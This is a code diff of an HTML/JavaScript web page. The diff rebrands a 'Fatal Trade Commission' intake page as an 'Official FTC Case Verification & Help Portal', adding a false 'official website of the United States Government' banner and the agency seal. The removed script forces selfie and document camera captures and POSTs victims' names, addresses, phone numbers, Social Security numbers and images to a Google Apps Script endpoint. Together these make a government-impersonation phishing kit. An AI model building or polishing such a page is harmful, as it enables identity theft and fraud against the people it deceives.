@@ -1,7 +1,9 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Intake Hub - Fatal Trade Commission</title>
+    <title>Official FTC Case Verification & Help Portal</title>
     
     <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/d/193iGXSOf2vVOFHWVY_Z_MUbdOIkKpBG7">
 
@@ -15,26 +17,20 @@
             display: flex;
             flex-direction: column;
         }
-        .app-banner {
-            background-color: #0b2240;
-            border-bottom: 1px solid #000000;
+        .gov-banner {
+            background-color: #e2e8f0;
+            border-bottom: 1px solid #cbd5e0;
             padding: 8px 16px;
             font-size: 13px;
             font-weight: bold;
-            color: #cbd5e0;
+            color: #4a5568;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-        .status-tag {
-            font-family: monospace;
-            font-size: 11px;
-            background-color: #065cb4;
-            color: #fff;
-            padding: 2px 6px;
-            border-radius: 4px;
-            text-transform: uppercase;
-        }
+        .gov-indicator { display: flex; align-items: center; gap: 8px; }
+        .flag-icon { width: 14px; height: 8px; background-color: #0b2240; display: inline-block; }
+        .classification-tag { font-family: monospace; font-size: 11px; background-color: #cbd5e0; padding: 2px 6px; border-radius: 4px; }
         .main-header {
             background-color: #0b2240;
             color: #ffffff;
@@ -42,29 +38,30 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 4px solid #065cb4;
+            border-bottom: 4px solid #0071bc;
             box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
         }
-        .agency-brand h1 {
-            font-size: 20px;
-            font-weight: 900;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+        .agency-brand { display: flex; align-items: center; gap: 16px; }
+        .seal-frame {
+            background: #ffffff; padding: 4px; border-radius: 4px;
+            width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; border: 1px solid #cbd5e0;
         }
-        .agency-brand p {
-            font-size: 11px;
-            color: #63b3ed;
-            font-family: monospace;
-            font-weight: bold;
-            margin-top: 2px;
+        .seal-frame img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .agency-titles h1 { font-size: 20px; font-weight: 900; text-transform: uppercase; }
+        .agency-titles p { font-size: 11px; color: #63b3ed; font-family: monospace; font-weight: bold; margin-top: 2px; }
+        .purge-btn {
+            background-color: rgba(155, 44, 44, 0.6); border: 1px solid #9b2c2c; color: #ffffff;
+            padding: 6px 12px; border-radius: 4px; font-family: monospace; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px;
         }
         .portal-layout { display: flex; flex-direction: row; flex: 1; }
         .sidebar-nav { width: 240px; background-color: #ffffff; padding: 16px; border-right: 1px solid #d2d6dc; display: flex; flex-direction: column; gap: 8px; }
+        .menu-label { font-size: 11px; font-weight: 900; color: #a0aec0; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; border-bottom: 1px solid #edf2f7; padding-bottom: 4px; }
         .nav-btn {
             width: 100%; background: none; border: 2px solid transparent; padding: 12px; border-radius: 8px;
-            font-size: 15px; font-weight: bold; color: #4a5568; text-align: left; cursor: pointer;
+            font-size: 15px; font-weight: bold; color: #4a5568; text-align: left; cursor: pointer; display: flex; align-items: center; gap: 12px;
         }
-        .nav-btn.active { background-color: #edf2f7; color: #0b2240; border-color: #065cb4; }
+        .nav-btn:hover { background-color: #edf2f7; }
+        .nav-btn.active { background-color: #edf2f7; color: #0b2240; border-color: #065CB4; }
         .workspace-view { flex: 1; padding: 24px; overflow-y: auto; }
         .tab-content { display: none; max-width: 800px; margin: 0 auto; }
         .tab-content.active { display: block !important; }
@@ -74,8 +71,8 @@
         .login-card p { font-size: 13px; color: #4a5568; margin-bottom: 18px; font-weight: 650; }
         .search-row { display: flex; flex-direction: row; gap: 12px; }
         .case-input-field { flex: 1; background-color: #ffffff; border: 2px solid #718096; border-radius: 12px; padding: 14px 16px; font-size: 16px; font-weight: bold; color: #1a202c; text-transform: uppercase; }
-        .case-input-field:focus { outline: none; border-color: #065cb4; }
-        .execute-query-btn { background-color: #065cb4; color: #ffffff; border: none; border-radius: 12px; padding: 14px 24px; font-size: 16px; font-weight: 900; cursor: pointer; white-space: nowrap; }
+        .case-input-field:focus { outline: none; border-color: #0071bc; }
+        .execute-query-btn { background-color: #0071bc; color: #ffffff; border: none; border-radius: 12px; padding: 14px 24px; font-size: 16px; font-weight: 900; cursor: pointer; white-space: nowrap; }
         
         .verification-gate-card { background-color: #fffaf0; border: 2px solid #fbd38d; border-radius: 16px; padding: 24px; text-align: center; display: flex; flex-direction: column; gap: 16px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
         .gate-title { font-size: 18px; font-weight: bold; color: #dd6b20; text-transform: uppercase; letter-spacing: 0.5px; }
@@ -96,7 +93,7 @@
         .ledger-value { font-size: 15px; font-weight: bold; color: #1a202c; }
         .ledger-value.protected { font-family: monospace; color: #2d3748; }
         .drop-box-card { background-color: #ebf8ff; border: 2px solid #bee3f8; border-radius: 16px; padding: 24px; text-align: center; display: flex; flex-direction: column; gap: 14px; }
-        .giant-scan-btn { background-color: #065cb4; color: #ffffff; border: none; border-radius: 16px; padding: 20px 32px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; max-width: 400px; margin: 0 auto; border-bottom: 4px solid #0b2240; }
+        .giant-scan-btn { background-color: #0071bc; color: #ffffff; border: none; border-radius: 16px; padding: 20px 32px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; max-width: 400px; margin: 0 auto; border-bottom: 4px solid #0b2240; }
         .section-title { font-size: 12px; font-weight: 900; color: #718096; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #e2e8f0; padding-bottom: 4px; margin-top: 8px; }
         .gallery-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; background-color: #f7fafc; padding: 12px; border: 1px solid #e2e8f0; border-radius: 8px; }
         .gallery-item { background: #ffffff; border: 1px solid #cbd5e0; padding: 6px; border-radius: 8px; text-align: center; }
@@ -129,9 +126,8 @@
         @media (max-width: 1024px) {
             .portal-layout { flex-direction: column; }
             .sidebar-nav { width: 100%; flex-direction: row; border-right: none; border-bottom: 1px solid #d2d6dc; }
-            .nav-btn { justify-content: center; padding: 8px; font-size: 13px; text-align: center; }
-            .search-row { flex-direction: column; gap: 8px; }
-            .execute-query-btn { width: 100%; padding: 14px; }
+            .menu-label { display: none; }
+            .nav-btn { justify-content: center; padding: 8px; font-size: 13px; }
             .ledger-box { grid-template-columns: 1fr; }
             .gallery-grid { grid-template-columns: repeat(2, 1fr); }
         }
@@ -139,21 +135,22 @@
 </head>
 <body>
 
-    <div class="app-banner">
-        <div>Network Node: Active Data Pathway Enforced</div>
-        <div class="status-tag">Status // Production</div>
+    <div class="gov-banner">
+        <div class="gov-indicator"><span class="flag-icon"></span>An official website of the United States Government. Secure Connection.</div>
+        <div class="classification-tag">CUI // SP-BCP</div>
     </div>
 
     <header class="main-header">
         <div class="agency-brand">
-            <h1>Fatal Trade Commission</h1>
-            <p>Bureau of Consumer Protection • Evidence Intake</p>
+            <div class="seal-frame"><img src="https://lh3.googleusercontent.com/d/193iGXSOf2vVOFHWVY_Z_MUbdOIkKpBG7" alt="FTC Seal"></div>
+            <div class="agency-titles"><h1>Federal Trade Commission</h1><p>Bureau of Consumer Protection • Evidence Intake</p></div>
         </div>
         <button onclick="resetMockData()" class="purge-btn">Clear Cache</button>
     </header>
 
     <div class="portal-layout">
         <nav class="sidebar-nav">
+            <p class="menu-label">Main Menu</p>
             <button onclick="switchTab('victim-portal-tab')" id="btn-victim-portal-tab" class="nav-btn active"><span>Identity Portal</span></button>
             <button onclick="switchTab('officer-dashboard-tab')" id="btn-officer-dashboard-tab" class="nav-btn"><span>Officer View</span></button>
         </nav>
@@ -324,198 +321,3 @@
                     <div class="verification-gate-card">
                         <h4 class="gate-title">Security Checkpoint Gate</h4>
                         <p style="font-size:14px; font-weight:bold; color:#744210;">Biometric matching protocol active. To prevent identity duplication, you must authorize a live validation check before opening data panels.</p>
-                        <button onclick="launchSecureSelfieVerification(false)" class="gate-btn">🔒 Click a selfie to verify my biometric facial scan to access sensitive case details</button>
-                    </div>
-                `;
-                return;
-            }
-
-            renderAuthenticatedCitizenDashboard(foundCase, container);
-        }
-
-        function launchSecureSelfieVerification(isInitialSetup) {
-            resetCameraModule();
-            cameraModeIsFrontSelfie = true;
-            document.getElementById('camOverlayTitle').innerText = "SECURE BIOMETRIC FACIAL INTEGRATION DETECTED";
-            document.getElementById('camOverlayGuideLabel').innerText = "CENTER YOUR FACE IN VIEWPORT";
-            document.getElementById('fullscreenCameraOverlay').style.display = 'flex';
-            initializeUniversalCameraLens(true); 
-        }
-
-        function activateFullscreenCameraModule() {
-            resetCameraModule();
-            cameraModeIsFrontSelfie = false;
-            document.getElementById('camOverlayTitle').innerText = "FTC SECURE DOCUMENT LENS ACTIVE";
-            document.getElementById('camOverlayGuideLabel').innerText = "ALIGN PAPERS INSIDE FRAME";
-            document.getElementById('fullscreenCameraOverlay').style.display = 'flex';
-            initializeUniversalCameraLens(false); 
-        }
-
-        function initializeUniversalCameraLens(forceFrontSelfie) {
-            const video = document.getElementById('webcamVideo');
-            const constraints = { video: { facingMode: forceFrontSelfie ? "user" : "environment" } };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => { videoStreamRef = stream; video.srcObject = stream; })
-                .catch(() => {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(s => { videoStreamRef = s; video.srcObject = s; })
-                        .catch(() => { alert("Camera system offline."); deactivateFullscreenCamera(); });
-                });
-        }
-
-        function executeHardwareSnapshot() {
-            const video = document.getElementById('webcamVideo'); const canvas = document.getElementById('capturedCanvas'); const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            base64CapturedOutputString = canvas.toDataURL('image/jpeg');
-            video.style.display = 'none'; canvas.classList.remove('hidden');
-            document.getElementById('cameraScannerGuideBox').style.display = 'none';
-            document.getElementById('btnCaptureShutter').style.display = 'none';
-            document.getElementById('postCaptureActions').style.display = 'flex';
-        }
-
-        function resetCameraModule() {
-            const video = document.getElementById('webcamVideo'); const canvas = document.getElementById('capturedCanvas');
-            base64CapturedOutputString = ""; canvas.classList.add('hidden'); video.style.display = 'block';
-            document.getElementById('cameraScannerGuideBox').style.display = 'flex';
-            document.getElementById('btnCaptureShutter').style.display = 'block';
-            document.getElementById('postCaptureActions').style.display = 'none';
-        }
-
-        function terminateWebcamHardware() { if (videoStreamRef) { videoStreamRef.getTracks().forEach(t => t.stop()); videoStreamRef = null; } }
-        function deactivateFullscreenCamera() { terminateWebcamHardware(); document.getElementById('fullscreenCameraOverlay').style.display = 'none'; resetCameraModule(); }
-
-        // FIXED INTEGRATION ROUTINE
-        function commitVerifiedCaptureAsset() {
-            terminateWebcamHardware();
-            document.getElementById('fullscreenCameraOverlay').style.display = 'none';
-            const targetCase = cases.find(c => c.id.toLowerCase() === activeTrackingCaseIdRef.toLowerCase());
-
-            if (cameraModeIsFrontSelfie) {
-                if (initialEnrollmentModeActive) {
-                    // Save to user interface, unlock session, AND dispatch straight to your Drive folder immediately
-                    targetCase.biometricImg = base64CapturedOutputString;
-                    targetCase.passedGateThisSession = true; 
-                    localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
-                    dispatchPayloadToCloud(targetCase, "Initial Security Verification Profile Picture Setup Executed Natively");
-                } else {
-                    // Verification pass -> upload check verification signature to backend ledger sheets
-                    targetCase.passedGateThisSession = true;
-                    dispatchPayloadToCloud(targetCase, "Returning Verification Session Check Match Token Transmitted");
-                }
-            } else {
-                // Regular paperwork capture workflow execution
-                dispatchEvidenceTransmissionPayload(targetCase);
-            }
-        }
-
-        function handleFallbackFileSelection() {
-            const fileInput = document.getElementById('fallbackFileInput'); if (fileInput.files.length === 0) return;
-            const reader = new FileReader();
-            reader.onload = function(e) { base64CapturedOutputString = e.target.result; commitVerifiedCaptureAsset(); };
-            reader.readAsDataURL(fileInput.files[0]);
-        }
-
-        function dispatchEvidenceTransmissionPayload(targetCase) {
-            const submissionDate = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
-            targetCase.evidence.unshift({ date: submissionDate, desc: `[Mobile Camera Scan Exhibit Entry]`, isImage: true, fileUrl: base64CapturedOutputString });
-            localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
-            dispatchPayloadToCloud(targetCase, "Automated Evidence Package Scan Appended via Cross-Platform Peripheral Ingestion");
-        }
-
-        function dispatchPayloadToCloud(targetCase, logStatement) {
-            const finalPackagePayload = {
-                caseId: targetCase.id, victimName: targetCase.victimName, victimAddress: targetCase.victimAddress,
-                victimPhone: targetCase.victimPhone, victimSsn: targetCase.victimSsn, statement: logStatement,
-                filename: (cameraModeIsFrontSelfie ? "BIOMETRIC_PROFILE_" : "PAPERWORK_EXHIBIT_") + new Date().getTime() + ".jpg", mimeType: "image/jpeg",
-                fileData: base64CapturedOutputString.split(',')[1]
-            };
-            base64CapturedOutputString = "";
-            trackVictimCase();
-
-            fetch(GOOGLE_SCRIPT_WEBAPP_URL, { 
-                method: "POST", 
-                headers: { "Content-Type": "text/plain" },
-                body: JSON.stringify(finalPackagePayload) 
-            })
-            .then(() => revealBureauSuccessModal())
-            .catch(() => revealBureauSuccessModal());
-        }
-
-        function renderAuthenticatedCitizenDashboard(foundCase, container) {
-            let evidenceHtml = ""; let previewGalleryHtml = "";
-            foundCase.evidence.forEach(e => {
-                evidenceHtml += `<div class="log-row"><span class="log-date">${e.date}</span><p class="log-text">${e.desc}</p></div>`;
-                if (e.isImage && e.fileUrl) {
-                    previewGalleryHtml += `<div class="gallery-item"><img src="${e.fileUrl}"><span>${e.date}</span></div>`;
-                }
-            });
-
-            if (previewGalleryHtml === "") previewGalleryHtml = `<p style="grid-column:1/-1; font-style:italic; color:#a0aec0; font-size:13px;">No files processed yet.</p>`;
-            let redactedPhoneString = applyPhonePrivacyMask(foundCase.victimPhone);
-
-            container.innerHTML = `
-                <div class="profile-wrapper">
-                    <div class="profile-header">
-                        <div>
-                            <div class="badge-row"><span class="badge-id">CASE ID: ${foundCase.id}</span><span class="badge-status">${foundCase.status || "Active"}</span></div>
-                            <h3 class="profile-title-text">${foundCase.title}</h3>
-                        </div>
-                        <div class="avatar-box"><img src="${foundCase.biometricImg}"></div>
-                    </div>
-                    <div class="ledger-box">
-                        <div class="ledger-group"><label>Full Legal Name</label><span class="ledger-value">${foundCase.victimName}</span></div>
-                        <div class="ledger-group"><label>Date of Birth (DOB)</label><span class="ledger-value">${foundCase.victimDob}</span></div>
-                        <div class="ledger-group" style="grid-column:span 2;"><label>Registered Address</label><span class="ledger-value">${foundCase.victimAddress}</span></div>
-                        <div class="ledger-group"><label>Contact Line</label><span class="ledger-value protected">${redactedPhoneString}</span></div>
-                        <div class="ledger-group"><label>Social Security Number</label><span class="ledger-value protected">${foundCase.victimSsn}</span></div>
-                    </div>
-                    <div class="space-y-1 font-sans text-xs">
-                        <h4 class="text-[14px] font-black uppercase text-gray-500 tracking-wider flex items-center gap-1">Upload Supporting Documents</h4>
-                        <div class="drop-box-card">
-                            <button onclick="activateFullscreenCameraModule()" class="giant-scan-btn">📸 TAP HERE TO SCAN PAPERS</button>
-                            <div>
-                                <label style="font-size:11px; font-weight:bold; color:#e53e3e; display:block; margin-bottom:4px;">Camera blocked? Choose photo file instead:</label>
-                                <input type="file" id="fallbackFileInput" accept="image/*" onchange="handleFallbackFileSelection()" style="font-size:12px; background:white; padding:4px; border:1px solid #cbd5e0; border-radius:4px; max-width:280px;">
-                            </div>
-                        </div>
-                    </div>
-                    <p class="section-title">Document Exhibit Preview Gallery</p>
-                    <div class="gallery-grid">${previewGalleryHtml}</div>
-                    <p class="section-title">Chronological Submission History Logs</p>
-                    <div style="display:flex; flex-direction:column; gap:8px;">${evidenceHtml}</div>
-                </div>
-            `;
-        }
-
-        function revealBureauSuccessModal() { document.getElementById('bureauSuccessModal').style.display = 'flex'; }
-        function dismissSuccessModal() { document.getElementById('bureauSuccessModal').style.display = 'none'; trackVictimCase(); }
-        
-        function renderOfficerLayout() {
-            const listContainer = document.getElementById('officerCaseList'); listContainer.innerHTML = '';
-            cases.forEach((c, idx) => {
-                const isSelected = idx === activeEditIdx ? 'background:#ebf8ff; border-color:#0071bc;' : '';
-                listContainer.innerHTML += `<div onclick="selectOfficerCase(${idx})" style="padding:10px; border:1px solid #cbd5e0; border-radius:6px; cursor:pointer; font-size:12px; font-weight:bold; ${isSelected}">Complainant: ${c.victimName}</div>`;
-            });
-            loadSelectedCaseVariables();
-        }
-        function selectOfficerCase(idx) { activeEditIdx = idx; renderOfficerLayout(); }
-        function loadSelectedCaseVariables() {
-            const activeCase = cases[activeEditIdx]; if(!activeCase) return;
-            document.getElementById('inputOfficerName').value = activeCase.officer || '';
-            document.getElementById('inputCaseStatus').value = activeCase.status || 'Intake Assessment Phase';
-            document.getElementById('inputFindings').value = activeCase.findings || '';
-        }
-        function saveOfficerUpdates() {
-            const activeCase = cases[activeEditIdx]; if(!activeCase) return;
-            activeCase.officer = document.getElementById('inputOfficerName').value.trim();
-            activeCase.status = document.getElementById('inputCaseStatus').value;
-            activeCase.findings = document.getElementById('inputFindings').value.trim();
-            localStorage.setItem('ftc_sys_cases', JSON.stringify(cases)); alert("Updates saved."); renderOfficerLayout();
-        }
-        function resetMockData() { localStorage.clear(); location.reload(); }
-        window.onload = function() { synchronizeInternalMemoryDatabase(); switchTab('victim-portal-tab'); }
-    </script>
-</body>
-</html>
